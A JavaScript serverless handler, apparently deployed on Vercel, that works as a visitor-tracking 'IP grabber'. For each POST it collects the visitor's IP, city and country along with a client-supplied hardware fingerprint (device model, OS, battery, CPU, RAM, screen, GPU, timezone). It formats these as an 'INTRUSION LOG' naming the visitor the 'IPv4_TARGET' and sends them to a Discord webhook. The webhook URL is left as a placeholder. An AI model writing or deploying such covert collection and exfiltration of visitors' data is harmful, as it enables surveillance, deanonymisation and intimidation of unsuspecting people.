export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method === 'POST') {
        try {
            const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
            const country = req.headers['x-vercel-ip-country'] || "Unknown Country";
            const city = req.headers['x-vercel-ip-city'] || "Unknown City";
            const userAgentString = req.headers['user-agent'] || "Unknown UA";
            const hardwareData = req.body || {};

            const timestamp = new Date().toISOString();

            // 🚀 Vercel Console Log
            console.log("==================== CRIMINAL INVESTIGATION DATA ====================");
            console.log(JSON.stringify({ ip, city, country, hardwareData }, null, 2));
            console.log("=====================================================================");

            // 🟢 ANSI एस्केप कोड्स (टर्मिनल ग्रीन फोंट वाइब के लिए)
            const ansiGreen = "\u001b[1;32m";
            const ansiWhite = "\u001b[0;37m";

            // 🖥️ हैकर टर्मिनल ब्लॉक का निर्माण
            const terminalOutput = [
                "```ansi",
                `${ansiGreen}[+] INTRUSION LOG ATTACHED // INTERNAL MONITORING${ansiWhite}`,
                `${ansiGreen}--------------------------------------------------${ansiWhite}`,
                `${ansiGreen}TIMESTAMP   :${ansiWhite} ${timestamp}`,
                `${ansiGreen}IPv4_TARGET :${ansiWhite} ${ip}`,
                `${ansiGreen}GEOLOCATION :${ansiWhite} ${city}, ${country}`,
                `${ansiGreen}OS_DETECTED :${ansiWhite} ${hardwareData.exactModel || "N/A"} (v${hardwareData.osVersion || "N/A"})`,
                `${ansiGreen}TIMEZONE    :${ansiWhite} ${hardwareData.timezone || "N/A"}`,
                `${ansiGreen}POWER_MGMT  :${ansiWhite} CAP: ${hardwareData.batteryLevel || "N/A"} // CHARGING: ${hardwareData.isCharging || "N/A"}`,
                `${ansiGreen}CPU_INFO    :${ansiWhite} ${hardwareData.cores || "N/A"} CORE PROCESSING UNITS`,
                `${ansiGreen}RAM_CAPACITY:${ansiWhite} ${hardwareData.ram || "N/A"} GB ARCHITECTURE`,
                `${ansiGreen}DISPLAY_RES :${ansiWhite} ${hardwareData.screenRes || "N/A"} DISPLAY FRAME`,
                `${ansiGreen}--------------------------------------------------${ansiWhite}`,
                `${ansiGreen}[*] HARDWARE_GRAPHICS_RENDERER:${ansiWhite}`,
                `${hardwareData.gpuRenderer || "N/A"}`,
                `${ansiGreen}[*] BROWSER_USER_AGENT_STRING:${ansiWhite}`,
                `${userAgentString}`,
                "```"
            ].join("\n");

            const discordPayload = {
                username: "📟 TERMINAL_MONITOR",
                avatar_url: "https://imgur.com",
                content: terminalOutput
            };

            const discordWebhookUrl = "https://discord.com"; 
            
            await fetch(discordWebhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(discordPayload)
            });

            return res.status(200).json({ status: "processed" });
        } catch (err) {
            console.error("Internal Server Logger Error:", err.message);
            return res.status(500).json({ error: err.message });
        }
    }

    return res.status(405).json({ error: "Method not allowed" });
}
